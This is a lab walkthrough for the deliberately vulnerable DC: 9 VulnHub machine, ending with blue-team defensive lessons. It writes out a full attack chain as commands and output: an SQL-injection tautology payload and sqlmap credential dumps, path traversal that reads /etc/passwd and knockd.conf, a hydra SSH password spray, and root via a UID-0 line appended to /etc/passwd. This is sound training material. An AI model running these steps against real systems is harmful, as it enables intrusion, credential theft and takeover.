# DC: 9 — VulnHub Walkthrough (Beginner Friendly)

> This is a deliberately vulnerable machine for *learning*. Only ever attack a
> box you own or were given written permission to test. Keep it on an isolated
> host-only / NAT lab network that can't reach the internet.

| Field | Value |
| --- | --- |
| **Machine** | DC: 9 |
| **Difficulty** | Intermediate |
| **Author** | DCAU |
| **Released** | 29 Dec 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/dc-9,412/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/dc-9,412/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Debian 64-bit) |

> **A note on exact values:** passwords, banner text, IP addresses, knock
> sequences, and the flag contents **vary by build**. Every IP here is the
> example `192.168.56.101`. Substitute whatever address `arp-scan` reports for
> you. The *method* is what matters, not the literal strings.

---

## 0. What you will learn

- How to discover a host and its open ports, and why port 22 says "filtered".
- How to find a **UNION-based SQL injection** and dump credentials with `sqlmap`.
- How to find and use a **Local File Inclusion (LFI)** to read files on the box.
- What **port knocking** is, and how to use the LFI to recover the knock secret.
- How to **password spray** recovered credentials against SSH with `hydra`.
- How to abuse a `sudo`-allowed custom binary to get **arbitrary file write** and
  become root via `/etc/passwd`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# See your own address and the lab subnet first
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your attacker is on `192.168.56.0/24`, so the DC: 9 box
> will be on the same subnet.

```bash
# ARP-scan the subnet to list live hosts (fast, layer 2)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   (your Kali)
192.168.56.101  (unknown device)   <-- the target
```

> **Why it works:** ARP resolves "who has this IP?" at the link layer, so it
> finds hosts even if they drop ICMP or block TCP. Standard first move.

![finding the target](images/01-recon.png)

**Target IP:** `192.168.56.101` (yours will differ).

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 192.168.56.101
```

```text
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
```

> **How to read it:** port 80 is open, but port 22 is **filtered** — a firewall
> is dropping our packets. That is a clue: SSH exists but something is hiding
> it. We will come back to this. (Some full scans and fast sequences can
> accidentally flush the firewall rule open; see section 3.4.)

```bash
sudo nmap -sC -sV -p 22,80 192.168.56.101
```

```text
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Welcome to DC-9
22/tcp filtered ssh
```

![nmap service scan](images/02-nmap.png)

Browsing the site reveals a staff-records PHP application with three pages:

- `display.php` — Display All Records
- `search.php` — Search (a form)
- `manage.php` — Manage (requires login)

> **How to read it:** a search form is a prime SQL-injection candidate. Forms
> feed user input straight into database queries.

---

## 3. Foothold — gaining the first shell

### 3.1 Confirm the SQL injection

The search box takes a first name. Try a classic tautology:

```bash
curl -s "http://192.168.56.101/search.php" --data "search=1' OR 1=1 -- -"
```

> **Why it works:** `' OR 1=1 -- -` closes the string, makes the `WHERE` clause
> always true (so *all* rows return), and comments out the rest. If the page
> suddenly lists every record, the parameter is injectable.

![finding the injection](images/03-enum.png)

### 3.2 Dump the databases with sqlmap

```bash
# Save the search request (or just use the URL form) and let sqlmap work
sqlmap -r search.txt --batch --dbs
# ...or direct:
sqlmap -u "http://192.168.56.101/search.php" \
       --data="search=test" --batch --dbs
```

```text
available databases [3]:
[*] information_schema
[*] Staff
[*] users
```

```bash
sqlmap -r search.txt -D Staff -T Users --dump --batch
```

```text
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | <md5 hash>                       |
+----------+----------------------------------+
```

> **Why it works:** the MD5 hash here belongs to `admin`. MD5 is fast and
> unsalted, so it is trivially crackable — paste it into a hash-cracking site /
> use `hashcat`, or check a rainbow table. For this build it resolves to
> `transorbital1` (varies by build).

```bash
sqlmap -r search.txt -D users -T UserDetails --dump --batch
```

```text
+----------+---------------+----------------+
| username | password      | ...            |
+----------+---------------+----------------+
| chandlerb| UrAG0D!       | ...            |
| joeyt    | Passw0rd      | ...            |
| janitor  | Ilovepeepee   | ...            |
| fredf    | B4-Tru3-001   | ...            |
| ...      | ...           | ...            |
+----------+---------------+----------------+
```

> **Why it works:** a whole `UserDetails` table of plaintext passwords is a
> goldmine — but it is **not** the web login, it is a set of *system/SSH*-style
> accounts we'll spray later. The workflow is: get web-accessible creds here,
> find the way to reach SSH, then spray.

### 3.3 Log in and find the LFI

Log in at `http://192.168.56.101/manage.php` as `admin` / `transorbital1`.

On the manage page you'll see an odd error at the footer:

```text
File does not exist
```

> **Why it works:** that message is produced by a PHP `include()` that failed —
> a classic sign of a **Local File Inclusion**. If we can control *which* file
> is included, we can read files on the server.

Fuzz for the parameter name:

```bash
ffuf -u "http://192.168.56.101/manage.php?FUZZ=index.php" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs 0 -c
```

```text
file     [Status: 200, Size: ...]
```

```bash
curl "http://192.168.56.101/manage.php?file=../../../../etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

> **Why it works:** the page does `include('directory/' . $_GET['file'])` with
> no validation. `../` climbs out of the directory and reads any file the web
> user can read.

### 3.4 Recover the port-knock secret

Why is port 22 filtered? Because a **port-knock daemon** (`knockd`) is holding
it shut until the right sequence of ports is "knocked". Read its config via LFI:

```bash
curl "http://192.168.56.101/manage.php?file=../../../../etc/knockd.conf"
```

```text
[options]
    UseSyslog

[openSSH]
    sequence    = 7469,8475,9842
    seq_timeout = 5
    command     = /sbin/iptables -A INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn

[closeSSH]
    sequence    = 9842,8475,7469
    seq_timeout = 5
    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
    tcpflags    = syn
```

> **Why it works:** `knockd.conf` literally hands us the secret handshake. The
> sequence and ports **vary by build** if the author changed them — read them
> from *your* box, don't trust these values blindly.

### 3.5 Knock, then spray SSH

Send a SYN to each port in order to open 22:

```bash
for i in 7469 8475 9842; do nc -w1 192.168.56.101 $i; done
```

```bash
# Confirm SSH is now open
nmap -p 22 192.168.56.101
```

```text
22/tcp open  ssh
```

> **Why it works:** knocking the ports in sequence makes `knockd` insert an
> iptables rule that allows *your* IP to reach port 22.

Now build username/password lists from the SQLi dump and spray with hydra:

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 ssh
```

```text
[22][ssh] host: 192.168.56.101   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.56.101   login: joeyt       password: Passw0rd
[22][ssh] host: 192.168.56.101   login: janitor     password: Ilovepeepee
```

```bash
ssh janitor@192.168.56.101
```

> **Why it works:** the same credentials found in the web database are *reused*
> as system accounts — the classic **password-spray** win.

### 3.6 Escalate the foothold: another password list

In `janitor`'s home there's a hidden directory with more passwords:

```bash
ls -la
cat .secrets-for-putin/passwords-found-on-post-it-notes.txt
```

```text
BamBam01
...
```

Append these to your password list and spray again:

```bash
hydra -L usernames.txt -P passwords.txt 192.168.56.101 ssh
```

```text
[22][ssh] host: 192.168.56.101   login: fredf   password: B4-Tru3-001
```

> **Why it works:** social/offline password hygiene failed. `fredf` is our
> ticket to the privileged binary in the next section.

### 3.7 The user flag

DC: 9 only ships **one** flag, in `/root`, so there is no user flag — the
escalation below is the finale.

---

## 4. Privilege escalation — becoming root

```bash
ssh fredf@192.168.56.101
sudo -l
```

```text
User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

> **Why it works:** `fredf` can run a custom binary as root without a password.
> That is the whole escalation path if the binary can be abused.

Inspect what it does (the source is available on the box):

```bash
cat /opt/devstuff/test.py
```

```python
#!/usr/bin/python
import sys
if len(sys.argv) != 3:
    print ("Usage: python test.py read append")
    sys.exit (1)
else:
    f = open(sys.argv[1], "r")
    output = (f.read())
    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

> **Why it works:** `test` reads file **argv[1]** and *appends its contents* to
> file **argv[2]**. Run as root, that is **arbitrary file write** — hugely
> powerful.

Exploit: append a new **root-equivalent** user to `/etc/passwd`.

```bash
# 1. Generate a password hash (on the target or Kali)
openssl passwd -1 -salt hacker 'Password123!'
```

```text
$1$hacker$9W.1eI2oQiDkOpMUxHPja0
```

```bash
# 2. Craft a passwd line: user:hash:UID:GID:comment:home:shell
echo 'hacker:$1$hacker$9W.1eI2oQiDkOpMUxHPja0:0:0::/root:/bin/bash' > /tmp/newuser
```

> **Why it works:** `UID 0` and `GID 0` make this account **root-equivalent**.
> `/etc/passwd` is a flat text database; appending a line is enough.

```bash
# 3. Use the sudo binary to append our line to the real /etc/passwd
sudo /opt/devstuff/dist/test/test /tmp/newuser /etc/passwd
```

```bash
# 4. Switch to our new account and prove we are root
su hacker
# Password: Password123!
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** the append succeeded because root ran it. Our `hacker`
> account has UID/GID 0, so `su hacker` gives a full root shell.

> **Alternative (SSH key):** you could instead `sudo test /tmp/authorized_keys
> /root/.ssh/authorized_keys` — but this fails if `/root/.ssh/` doesn't exist,
> which is why the `/etc/passwd` trick is the reliable path.

### The root flag

```bash
cd /root
ls
cat theflag.txt
```

```text
Congratulations!!!  Hope you enjoyed DC-9.
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | UNION-based SQL injection | `search.php` (search parameter) | Dumped `Staff`/`users` databases |
| 2 | Cleartext passwords in a database | `users.UserDetails` | SSH credentials leaked |
| 3 | Local File Inclusion | `manage.php?file=` | Read `/etc/passwd`, `/etc/knockd.conf` |
| 4 | Weak MD5 admin hash | `Staff.Users` | Admin web login cracked |
| 5 | Port knocking secret readable via LFI | `/etc/knockd.conf` | SSH "hidden" port exposed |
| 6 | Password reuse / weak system passwords | system accounts | SSH footholds via hydra |
| 7 | `sudo NOPASSWD` on a file-copy binary | `/opt/devstuff/dist/test/test` | Arbitrary file write → root |

## 6. Defensive lessons (blue team)

- **Fix the injection first.** Prepared statements / parameterised queries make
  the SQL database unreachable from the search box.
- **Never store plaintext passwords.** System and application credentials must
  be salted+hashed; a database dump should not be a credential dump.
- **Validate file paths.** The LFI exists because `include` trusts `$_GET`.
  Use an allow-list of permitted filenames, never raw user input.
- **Port knocking is not authorisation.** It hides SSH but the secret lived in
  a world-readable config; combine it with keys/2FA, not as the sole control.
- **Least privilege for operators.** A user running an arbitrary copy binary as
  root is a root shell waiting to happen. Constrain `sudoers` to exact,
  safe commands.
- **Harden `/etc/passwd`.** Any process that can append to it can add UID-0
  users; restrict write access and monitor file-integrity.
- **Detect it:** alert on SSH sprays (many failures), on sudo invoking custom
  binaries, and on new UID-0 entries in `/etc/passwd`.

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/dc-9,412/>
- Community writeups consulted:
  - [Fahmi FJ — VulnHub DC-9](https://fahmifj.github.io/ctf/vulnhub/dc-9/)
  - [Hacking Articles — DC: 9 Vulnhub Walkthrough](https://www.hackingarticles.in/dc-9-vulnhub-walkthrough/)
  - [benkyou — Vulnhub DC-9](https://benkyousec.github.io/posts/vulnhub-dc9/)
  - [d3vyce — Writeup DC-9](https://blog.d3vyce.fr/writeup-ctf/writeup-dc-9-vulnhub/)
- Tool docs:
  - [knockd / port knocking overview](https://en.wikipedia.org/wiki/Port_knocking)
  - [sqlmap documentation](https://sqlmap.org/)
  - [ffuf](https://github.com/ffuf/ffuf)
  - [Hydra](https://github.com/vanhauser-thc/thc-hydra)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with arp-scan
- [ ] `images/02-nmap.png` — port 80 open, port 22 filtered
- [ ] `images/03-enum.png` — the `search.php` SQL injection / sqlmap dump
- [ ] `images/04-lfi.png` — reading `/etc/passwd` via `manage.php?file=`
- [ ] `images/05-knock.png` — `/etc/knockd.conf` and the knock sequence
- [ ] `images/06-spray.png` — hydra finding SSH credentials
- [ ] `images/07-privesc.png` — `sudo -l` showing the `test` binary
- [ ] `images/08-root-flag.png` — the root flag

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
